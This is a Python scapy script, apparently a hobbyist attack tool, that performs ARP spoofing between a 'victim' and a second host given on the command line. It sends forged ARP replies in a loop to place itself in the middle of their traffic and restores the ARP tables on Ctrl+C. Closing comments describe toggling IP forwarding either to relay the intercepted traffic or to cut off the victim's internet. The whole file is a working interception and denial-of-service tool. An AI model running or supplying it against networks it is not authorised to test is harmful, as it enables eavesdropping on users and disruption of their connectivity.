#! /usr/bin/env python
# >> If you don't execute "echo 1 > /proc/sys/net/ipv4/ip_forward" then the target system
# won't be able to access internet because this system wont allow packets to flow through
# this system, if packet forwarding is not enabled.

import scapy.all as scapy
import time
import argparse

# >******************ARGUMENT INPUT FUNCTION *********************************************************************
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", dest="vip", help="IP-Address of target1")
    parser.add_argument("-t", "--target", dest="tip", help="IP-Address of target2")

    val = parser.parse_args()

# ******************************* > Argument error Checking !!! *****************************
    if not val.tip:
        parser.error("[+] Please specify the TARGET-2/2nd SYSTEM's IP-ADDRESS ;use --help for more information")
    elif not val.vip:
        parser.error("[+] Please specify the TARGET-1/VICTIM's IP-ADDRESS ;use --help for more information")

    return val
# >*****************************************************************************************************************


#****************************** MAC-EXTRACTION FUNCTION ***********************************************************
def get_mac(ip):
    #                   PART A1 -> ARP PACKET CREATION
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    #                   PART A2 -> ARP BROADCAST SENDING AND ANSWER CAPTURE
    arp_req_bc = broadcast/arp_req
    ans_list = scapy.srp(arp_req_bc, timeout=1, verbose=False)[0]
    # print(ans_list[0][1].hwsrc)   # If there is only one IP address to scan then there is no need of a "for-loop"
    return ans_list[0][1].hwsrc
# *****************************************************************************************************************


# ******************************* ACTUAL ARP_SPOOFING FUNCTION ****************************************************
def spoof(target_ip,spoof_ip):  # Takes a target-ip and a spoof-ip and tricks the target by saying we are the owner of the spoof-ip.

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)  # creates a response for the target saying we are the owner of the soppf-ip
    scapy.send(packet, verbose=False)
# *****************************************************************************************************************


# ******************************** ARP-TABLE_RESTORATION FUNCTION *************************************************
def restore(target_ip, spoof_ip):
    dest_MAC = get_mac(target_ip)
    src_MAC = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_MAC, psrc=spoof_ip, hwsrc=src_MAC)
    scapy.send(packet, count=4, verbose=False)
# *****************************************************************************************************************


value = get_args()
packet_counter = 0
print("")
print("[+] Started sending the Spoof packets..... !WARNING Attack Started !!!!\n")
try:
    while True:
        spoof(value.vip, value.tip)
        spoof(value.tip, value.vip)
        packet_counter = packet_counter + 2
        print("\r[+] Packets sent :", packet_counter, end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("")
    print("[+] !Stopping the Attack ...... Ctrl+C Detected ...... [-] Restoring ARP Tables.......")
    restore(value.vip, value.tip)
    restore(value.tip, value.vip)

# BEFORE EXECUTING THE CODE, GO TO THE TERMINAL AND EXECUTE THE FOLLOWING COMMAND

# To Cut Internet of Victim :- echo 0 > /proc/sys/net/ipv4/ip_forward
# ARP_SPOOF with Internet connection :- echo 1 > /proc/sys/net/ipv4/ip_forward
